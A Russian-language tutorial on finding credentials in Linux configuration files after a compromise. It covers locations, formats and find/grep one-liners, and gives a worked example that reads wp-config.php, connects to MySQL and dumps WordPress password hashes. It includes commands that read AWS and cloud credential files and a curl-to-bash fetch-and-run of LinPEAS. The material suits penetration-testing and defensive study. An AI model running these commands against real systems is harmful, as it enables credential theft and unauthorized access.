# Поиск учётных данных в конфигурационных файлах

## 1. Контекст и базовые понятия: место поиска в пост‑эксплуатации и классификация конфигурационных источников

Поиск учётных данных в конфигурационных файлах — одна из первых и наиболее результативных операций разведки после успешной компрометации Linux-хоста. В модели Cyber Kill Chain он приходится на фазу *Actions on Objectives*, когда атакующий уже обладает начальным доступом (обычно с ограниченными правами — например, shell от веб-сервера, пользователя `www-data`) и стремится расширить контроль над системой или смежными ресурсами. В более детальной методологии MITRE ATT&CK эта активность классифицируется как техника [Unsecured Credentials: Credentials in Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/) в рамках тактики Credential Access, а также нередко сопряжена с [Local File Discovery (T1083)](https://attack.mitre.org/techniques/T1083/) при навигации по файловой системе.

**Почему конфигурационные файлы привлекательны?** Прикладное программное обеспечение, фреймворки, системы управления контентом (CMS), контейнеризация и средства оркестрации вынуждены где-то хранить пароли, ключи API и строки подключения к базам данных. Разработчики и администраторы по умолчанию оставляют эти секреты в текстовых конфигурационных файлах, часто в открытом виде или в легко обратимом Base64-кодировании. Опросы утечек показывают, что более 70 % секретов, обнаруженных в публичных репозиториях, изначально лежали в конфигурационных файлах (plaintext). Пост‑эксплуатационный сбор таких артефактов — низко‑висящий плод: не требует сложных эксплоитов, редко фиксируется системами мониторинга целостности (если они вообще настроены на специфические пути), и может мгновенно дать доступ к базам данных, API‑ключам облачных провайдеров, SSH‑ключам или паролям от других сервисов.

### 1.1 Роль этапа разведки после компрометации

Стандартная последовательность действий после получения shell‑доступа включает:
1. Стабилизация сессии (улучшение терминала с помощью `python3 -c 'import pty;pty.spawn("/bin/bash")'`).
2. Системная разведка: тип ОС, версия ядра, установленные пакеты (`lsb_release -a`, `uname -a`, `dpkg -l` / `rpm -qa`).
3. Сбор учётных данных, в том числе целенаправленный обход файловой системы в поиске конфигураций.

Именно на третьем шаге применяется описываемый подход. Его важность трудно переоценить: часто одного найденного конфига достаточно, чтобы подключиться к внутренней базе данных и, например, извлечь хеши паролей всех пользователей или модифицировать привилегии в приложении, что приведёт к горизонтальному или вертикальному расширению доступа.

### 1.2 Конфигурационные файлы как носители секретов

Главная особенность конфигурационных файлов — они являются штатным механизмом передачи приложению параметров соединения. Поэтому они:
- расположены по предсказуемым путям (документированным разработчиками платформы);
- читаются приложением, но часто не шифруются на уровне файла (шифрование средствами файловой системы — не альтернатива);
- содержат структурированную информацию (ключ-значение, YAML, JSON, INI), облегчающую автоматизированный парсинг.

Типичный пример — файл `wp-config.php` для WordPress, содержащий константы `DB_USER`, `DB_PASSWORD`, `DB_HOST`, или файл `config/database.yml` в Ruby on Rails с секцией `production`. На практике многие самописные скрипты и legacy-приложения хранят пароли в простом текстовом файле с разделителями.

### 1.3 Сравнение с другими техниками получения учётных данных

В таблице ниже показаны ключевые различия между поиском в конфигурационных файлах и альтернативными методами сбора credentials на Linux-хосте.

| Техника получения                       | Источник артефактов                   | Требуемые привилегии | Вероятность нахождения валидных секретов | Характерные артефакты / индикаторы           |
|-----------------------------------------|---------------------------------------|----------------------|-----------------------------------------|----------------------------------------------|
| **Поиск в конфигурационных файлах**     | Файловая система приложений (`/var/www`, `/opt`, домашние каталоги) | Низкие (достаточно read для файла) | Очень высокая (десятки файлов на типичном веб-сервере) | Открытые текстовые пароли, строки подключения |
| Dump памяти процесса                    | Области памяти сервисов (`/proc/<pid>/mem`, core-дампы) | Требуются права процесса или root / ptrace | Средняя (зависит от того, загружены ли пароли в plaintext) | Строки паролей в дампе, возможно в бинарном окружении |
| Перехват сетевого трафика              | Проходящий трафик (tcpdump, ARP spoofing) | Обычно root для raw socket | Низкая, если пароль передаётся по шифрованному каналу (TLS, SSH) | Снифф-дампы с нешифрованными учётными данными |
| Keylogging                              | Перехват нажатий клавиш (kernel module, X11 hook) | Высокие (загрузка модуля ядра, доступ к X-серверу) | Зависит от действий пользователя | Записи нажатий с таймстемпами                |
| Перехват аргументов командной строки    | `/proc/<pid>/cmdline` или аудит доступа к procfs | Низкие (достаточно read) | Средняя (пароли могут передаваться в CLI и видны всем пользователям) | Строки с опцией `--password=` в cmdline      |
| Credential harvesting из истории bash   | `.bash_history`, `.mysql_history`     | Низкие (владелец файла) | Низкая–средняя (пароли в командах попадают редко) | История команд с явными паролями             |

Как видно, поиск в конфигурационных файлах — один из наименее требовательных к привилегиям и наиболее стабильный по результативности метод. При этом его следы минимальны: контролируется только факт чтения файла (через аудит `inotify` или `auditd`), что в реальной эксплуатации редко отслеживается в отношении прикладных файлов.

### 1.4 Типовые категории конфигурационных файлов

Для систематизации приведём классификацию конфигурационных файлов с указанием типичных путей, форматов хранения учётных данных и примера содержимого.

| Категория                              | Типичные пути                              | Формат хранения секрета                         | Пример фрагмента/ключа                       |
|----------------------------------------|--------------------------------------------|-------------------------------------------------|----------------------------------------------|
| Веб-приложения / CMS                   | `/var/www/html/wp-config.php`, `/var/www/config/database.php` | Переменные PHP, YAML, INI, реже JSON           | `define('DB_PASSWORD', 'P@ssw0rd');`         |
| Фреймворки (Django, Rails, Node.js)    | `./settings.py`, `./config/database.yml`, `./.env` | Переменные окружения или конфигурационные хэши | `DATABASE_URL=postgres://user:pass@host/db`  |
| Системные конфиги сервисов            | `/etc/mysql/debian.cnf`, `/etc/postgresql/*.conf` | INI-подобный синтаксис                          | `password = secret`                          |
| Удалённый доступ и FTP                | `~/.netrc`, `~/.ssh/config` (с IdentityFile), `~/.ftpconfig` | Plaintext, ключи                                | `login myuser password mypass`                |
| Облачные инструменты CLI               | `~/.aws/credentials`, `~/.config/gcloud/credentials.db` | INI, JSON                                       | `aws_secret_access_key = wJalrX...`          |
| CI/CD пайплайны                        | `.gitlab-ci.yml`, `Jenkinsfile`, `~/.docker/config.json` | YAML, JSON (часто Base64)                       | `"auths": {"https://index.docker.io/v1/": {"auth": "dXNlcjpwYXNz"}}` |
| Контейнеры и Kubernetes                | `./docker-compose.yml` (environment секция), манифесты K8s `secret.yaml` (Base64) | YAML, JSON                                       | `MYSQL_ROOT_PASSWORD: rootpass`              |

Пример реального файла — типичный фрагмент `wp-config.php`, демонстрирующий хранение учётных данных в виде PHP-констант:

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );
/** MySQL database username */
define( 'DB_USER', 'wp_user' );
/** MySQL database password */
define( 'DB_PASSWORD', 'suP3rS3cr3t!' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Любой пользователь, имеющий право чтения (`r`) на этот файл, получает полный доступ к базе данных WordPress.

## 2. Внутреннее устройство: структура хранения учётных данных в конфигурационных файлах Linux-окружений

Предметная область охватывает не только местонахождение секретов, но и их представление в различных форматах, а также связь с процессами, которые эти секреты потребляют. Понимание внутренней структуры хранения позволяет атакующему (и специалисту по защите) строить эффективные запросы поиска и оценивать потенциальную возможность извлечения plaintext-пароля.

### 2.1 Общая архитектура размещения конфигураций и потоков данных

На скомпрометированном Linux-хосте конфигурационные файлы распределены по нескольким иерархическим уровням, отражённым на упрощённой схеме ниже:

```text
[Файловая система]
├── /etc/                        (системные сервисы)
│   ├── mysql/                   (debian.cnf, my.cnf)
│   ├── postgresql/              (pg_hba.conf, .pgpass)
│   └── systemd/                 (окружения юнитов с паролями)
├── /var/www/                    (веб-приложения)
│   ├── html/wp-config.php
│   ├── config/database.yml
│   └── .env
├── /home/<user>/                (пользовательские приложения и CLI-инструменты)
│   ├── .aws/credentials
│   ├── .docker/config.json
│   ├── .bash_history
│   └── .netrc
├── /opt/                        (кастомные приложения)
│   └── application/config.yml
└── /run/secrets/                (Docker secrets — mount point)
```

Каждый файл содержит секреты в том или ином формате, но важно проследить **поток данных**: приложение при старте читает конфигурационный файл, извлекает пароль и устанавливает сетевое соединение или открывает сессию. Следовательно, если мы способны прочитать конфигурацию, мы можем повторить это соединение. Нередко в конфиге можно найти полный URI подключения: `mysql://user:pass@host:3306/db`, что делает атаку тривиальной.

### 2.2 Форматы хранения секретов и способы их восстановления

Секреты в конфигурационных файлах встречаются в нескольких формах:

1. **Plaintext (открытый текст)** — пароль или ключ записан непосредственно.
   *Пример:* `DB_PASS=CorrectHorseBatteryStaple`
   *Риск:* максимальный, не требует дополнительных шагов.

2. **Base64-кодирование** — не является шифрованием, а лишь преобразует бинарные данные в печатные символы. Часто применяется в Docker (`config.json`), Kubernetes secrets, CI/CD-переменных. Извлекается мгновенно:
   ```bash
   echo "dXNlcjpwYXNzd29yZA==" | base64 -d
   # Ожидаемый вывод: user:password
   ```

3. **Обратимое шифрование с ключом на том же хосте** — например, в конфигурациях Jenkins (`credentials.xml`) пароль может быть зашифрован с помощью `hudson.util.Secret`, ключ для расшифровки хранится в том же каталоге (`master.key`, `hudson.util.Secret`). Такие случаи требуют знания алгоритма, но инструменты пост‑эксплуатации (Jenkins Decrypt) автоматизируют процесс.

4. **Хешированные или «солёные» значения** — учётные данные, которые нельзя напрямую использовать для аутентификации, но могут быть подвергнуты офлайн-перебору (например, htpasswd-файлы). Это тоже ценный артефакт, хотя и выходит за рамки прямого поиска credentials.

5. **Переменные окружения** — не файл, но многие приложения получают пароль через переменные (`MYSQL_ROOT_PASSWORD`), которые сохраняются в соответствующих конфигурационных файлах (docker-compose.yml, systemd unit Env). Они видны через `/proc/<pid>/environ`, но файл конфигурации является первоисточником.

В таблице ниже сопоставлены частые форматы, методы извлечения и примеры типовых файлов:

| Формат секрета          | Типичный файл                       | Метод раскрытия до plaintext               | Пример команды / утилиты                           |
|-------------------------|-------------------------------------|--------------------------------------------|---------------------------------------------------|
| Plaintext              | `wp-config.php`, `settings.py`      | `cat`, `grep`                             | `grep -i password wp-config.php`                  |
| Base64                 | `~/.docker/config.json`, `secret.yaml` | `base64 -d`                              | `jq -r '.auths["..."].auth' config.json \| base64 -d` |
| Инструментальное шифрование | `credentials.xml` (Jenkins)     | Специализированный скрипт (Java)          | `jenkins-decrypt.py master.key hudson.util.Secret` |
| Хеш                    | `/etc/shadow`, `.htpasswd`          | John the Ripper / hashcat                 | `john --wordlist=rockyou.txt hashes.txt`          |

Для иллюстрации работы с Base64-кодированным секретом возьмём фрагмент `~/.docker/config.json`, который генерируется после аутентификации в Docker Hub:

```json
{
  "auths": {
    "https://index.docker.io/v1/": {
      "auth": "am9obmRvZTpzZWNyZXRwYXNzMTIz"
    }
  }
}
```

Поле `auth` содержит строку `"am9obmRvZTpzZWNyZXRwYXNzMTIz"` — это Base64-кодировка от `johndoe:secretpass123`. Расшифровка выполняется одной командой:

```bash
echo "am9obmRvZTpzZWNyZXRwYXNzMTIz" | base64 -d
# johndoe:secretpass123
```

### 2.3 Инварианты, позволяющие локализовать конфигурационные файлы

С точки зрения внутреннего устройства файловой системы Linux, большинство прикладных конфигураций имеют следующие общие черты, которые можно использовать в поисковых правилах:

- **Расширения:** `.conf`, `.cfg`, `.ini`, `.yaml`, `.yml`, `.json`, `.xml`, `.cnf`, `.env`, `.php` (в части разделов с define), `.properties`.
- **Имена файлов-индикаторов:** `config`, `settings`, `credentials`, `secrets`, `database`, `db`, `connection`, `passwd`, `shadow` (не только системный).
- **Мета-атрибуты:** владелец — часто root или служебный пользователь (например, `www-data`), права доступа `600`, `640`, `644`.
- **Содержимое:** ключевые слова `password`, `passwd`, `pass`, `pwd`, `secret`, `key`, `token`, `auth`, `api_key`, `DB_PASSWORD`, `DATABASE_URL`.

Понимание этих инвариантов позволяет создавать высокоточные фильтры `grep`, минимизирующие ложные срабатывания.

## 3. Применение и работа: практические методы и инструменты поиска учётных данных в конфигурационных файлах

После получения shell-доступа практические действия по поиску сводятся к целенаправленному рекурсивному обходу файловой системы с применением утилит командной строки и специализированных инструментов автоматизации. Ниже рассмотрены ручной и автоматизированный подходы, типичные ошибки и способы их устранения.

### 3.1 Ручной поиск с использованием find и grep

Базовым и незаменимым инструментом является связка `find` + `grep`. Она не требует установки дополнительного ПО и работает в любом Linux-окружении. Общий шаблон команды:

```bash
find /путь/поиска -type f \( -iname "*.conf" -o -iname "*.cfg" -o -iname "*.ini" -o -iname "*.yaml" -o -iname "*.yml" -o -iname "*.json" -o -iname "*.xml" -o -iname "*.cnf" -o -iname "*.env" -o -iname "*.php" \) -exec grep -i -E "password|passwd|pass|pwd|secret|key|token|auth|api_key|DB_PASSWORD" {} \; 2>/dev/null
```

Пояснения:
- `find` обходит целевой каталог (-type f — только обычные файлы);
- `-iname` — регистронезависимый поиск по паттерну имени, перечислены типичные расширения конфигов;
- `-exec grep` — для каждого файла выполняется поиск строк, удовлетворяющих расширенному регулярному выражению. Ключ `-i` — игнорирование регистра;
- `2>/dev/null` подавляет сообщения об ошибках доступа.

Более быстрый и менее нагружающий файловую систему вариант — использовать `grep` с опцией `-r` (рекурсивный поиск) и `-l` (только имена файлов), а затем вручную просматривать интересные результаты:

```bash
grep -ril "password" /var/www/ /etc/ /opt/ 2>/dev/null
```

Однако такой подход исключает фильтрацию по расширениям, что увеличивает шум (много бинарных файлов, логов). Поэтому предпочтительнее комбинированный метод.

**Пример результата** выполнения поиска на среднестатистическом веб-сервере:

```text
/var/www/html/wp-config.php:define( 'DB_PASSWORD', 'suP3rS3cr3t!' );
/var/www/app/.env:DB_PASSWORD=anothersecret
/etc/mysql/debian.cnf:password = qBR3DslZ5Rk
```

### 3.2 Целевые однострочники под конкретные технологии

Знание архитектуры позволяет сузить область поиска и повысить скорость обработки. Несколько полезных команд:

- **Django-приложения**: искать в settings.py или локальных .env:
  ```bash
  find / -name "settings.py" -exec grep -H "PASSWORD\|SECRET_KEY\|DATABASE_URL" {} \; 2>/dev/null
  ```

- **Node.js / Express**: типично хранение в `.env` и `config.js`:
  ```bash
  find / -name ".env" -o -name "config.js" | xargs grep -i "PASSWORD\|SECRET" 2>/dev/null
  ```

- **Docker Compose** и **Swarm**: в полях `environment` и `secrets`:
  ```bash
  find / -name "docker-compose*.yml" -exec grep -E "MYSQL_ROOT_PASSWORD|SA_PASSWORD|POSTGRES_PASSWORD" {} \; 2>/dev/null
  ```

- **Jenkins**: найти credentials.xml и расшифровать:
  ```bash
  find / -name "credentials.xml" -type f -exec cat {} \;
  # затем поиск master.key и hudson.util.Secret в том же родительском каталоге
  ```

- **Облачные CLI-конфиги**:
  ```bash
  cat ~/.aws/credentials 2>/dev/null
  cat ~/.config/gcloud/credentials.db 2>/dev/null
  ```

### 3.3 Автоматизация с помощью скриптов и фреймворков пост‑эксплуатации

Ручной поиск трудоёмок на больших системах с множеством приложений. Специализированные скрипты пост‑эксплуатации автоматизируют сбор credentials. Наиболее известные — [LinPEAS](https://github.com/carlospolop/PEASS-ng) и [LinEnum](https://github.com/rebootuser/LinEnum). Они объединяют десятки проверок, включая парсинг конфигурационных файлов, выводя в структурированном виде все найденные учётные данные.

Пример запуска LinPEAS:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash | tee linpeas.out
```

В секции «*Database credentials and other interesting data*» отчёта будут перечислены все файлы с паролями. Фрагмент вывода:

```text
╔══════════╣ Interesting Files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#interesting-files
-rw-r--r-- 1 root root 1024 May 22 10:00 /var/www/html/wp-config.php
...
```

При использовании автоматических инструментов важно помнить, что они могут генерировать большой объём трафика в файловой системе и потенциально быть замеченными системами мониторинга целостности (HIDS, Tripwire). Поэтому при целевых пентестах слепому запуску LinPEAS предпочитается поэтапный ручной сбор.

### 3.4 Типичные ошибки и подводные камни

1. **Недостаточные права.** Часть конфигураций (особенно `/etc/mysql/debian.cnf`) доступна только root или специализированной группе (`mysql`). Не получив root, атакующий может упустить эти файлы. Решение: всегда начинать поиск с доступных каталогов (`/var/www`), а затем отдельно проверить права на системные конфиги (`ls -la /etc/mysql/`). Если пользователь не может читать файл, результат grep через `2>/dev/null` будет пустым, и это не сигнализирует об отсутствии файла.

2. **Игнорирование скрытых файлов и каталогов.** Многие конфигурации хранятся в `.dot-файлах` (`.env`, `.aws`, `.dockercfg`). Команда `find` не исключает скрытые по умолчанию, но если использовать `ls` для ручного просмотра, их можно не заметить. Автоматические инструменты обычно покрывают их.

3. **Ложные срабатывания.** Ключевые слова `password` могут встречаться в комментариях или логах (например, `Failed password for invalid user`). Чтобы снизить шум, можно использовать более точные регулярки, например, искать присваивания: `grep -rP "(password|passwd)\s*[:=]\s*[\"']?\S+"`. Но при этом можно пропустить нестандартные форматы. Оптимальный подход — сначала широкий поиск, затем ручная фильтрация.

4. **Base64-секреты, оставшиеся незамеченными.** Если искать только ключевое слово `password`, можно пропустить поле `auth` в `config.json` (там нет слова password). Нужно отдельно искать файлы `config.json` и `secret.yaml` и анализировать их содержимое. Либо расширить grep-паттерн на `(auth|token|key)`.

## Сквозной практический пример: поиск и использование учётных данных MySQL на скомпрометированном веб-сервере

**Исходные условия:**
- Скомпрометирован хост с Ubuntu 22.04 LTS, получен shell от пользователя `www-data` через уязвимость в веб-приложении (RCE).
- На сервере развёрнут WordPress в `/var/www/html`.
- Установлены стандартные системные утилиты (`find`, `grep`, `mysql`).
- Задача: найти и использовать учётные данные базы данных для повышения привилегий через манипуляции с пользователями WordPress.

### Шаг 1. Определение целевых директорий и подготовка

Проверяем текущего пользователя и права на директорию веб-корня:

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls -la /var/www/html/
```

Вывод показывает наличие `wp-config.php` с правами чтения для всех (`-rw-r--r--`). Права позволяют прочитать файл.

### Шаг 2. Поиск конфигурационных файлов с учётными данными

Выполняем целенаправленный поиск PHP-конфигов с паролями в каталоге веб-приложений:

```bash
find /var/www/ -type f -iname "wp-config.php" -o -iname "config.php" -o -iname "settings.php" 2>/dev/null | head -5
# /var/www/html/wp-config.php
```

Ищем в этих файлах строки, содержащие `DB_PASSWORD`:

```bash
grep -i "DB_PASSWORD\|DB_USER\|DB_NAME\|DB_HOST" /var/www/html/wp-config.php
```

Результат:

```php
define( 'DB_NAME', 'wordpress_db' );
define( 'DB_USER', 'wp_admin' );
define( 'DB_PASSWORD', 'd3f3nD_Th3_WP!' );
define( 'DB_HOST', 'localhost' );
```

Учётные данные обнаружены: пользователь `wp_admin`, пароль `d3f3nD_Th3_WP!`, база данных `wordpress_db`, хост `localhost`.

### Шаг 3. Подключение к локальной MySQL-базе

Проверяем доступность клиента `mysql` и устанавливаем соединение (на хосте работает MySQL-сервер):

```bash
which mysql
# /usr/bin/mysql
mysql -u wp_admin -p'd3f3nD_Th3_WP!' -h localhost wordpress_db -e "show tables;" 2>/dev/null
```

Если соединение успешно, вывод покажет список таблиц WordPress (например, `wp_users`, `wp_options`), что подтвердит валидность учётных данных. При необходимости можно использовать `mysql` без вывода таблицы, а сразу запросить данные пользователей.

### Шаг 4. Извлечение хешей паролей пользователей WordPress

Извлекаем столбцы `user_login` и `user_pass` из таблицы `wp_users`:

```bash
mysql -u wp_admin -p'd3f3nD_Th3_WP!' -h localhost wordpress_db -e "SELECT user_login, user_pass FROM wp_users;" 2>/dev/null
```

Результат:

```
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$B5gJM4IbgmQoV5LQMYfJfuUhbMzXjH1 |
| editor     | $P$A9lrZkmm0PZx8HwEZH7kz1H2oNwQc/0 |
+------------+------------------------------------+
```

Получены хеши WordPress (переносимые, тип phpass). Эти хеши можно попытаться взломать офлайн (John the Ripper, `wp2john.py`) или использовать для аутентификации в панели администратора WordPress через подбор, если хеши слабые. В любом случае, компрометация базы данных дала доступ к учётным записям администраторов CMS, что часто эквивалентно полному контролю над веб-приложением.

### Ожидаемый вывод

Сквозной пример демонстрирует типичную цепочку: планомерный поиск конфигурационных файлов, обнаружение plaintext-пароля к БД, использование его для расширения доступа и получения хешей пользователей приложения. Это иллюстрирует, как всего один найденный конфигурационный файл (прочитанный с минимальными правами) может привести к существенному повышению уровня компрометации.
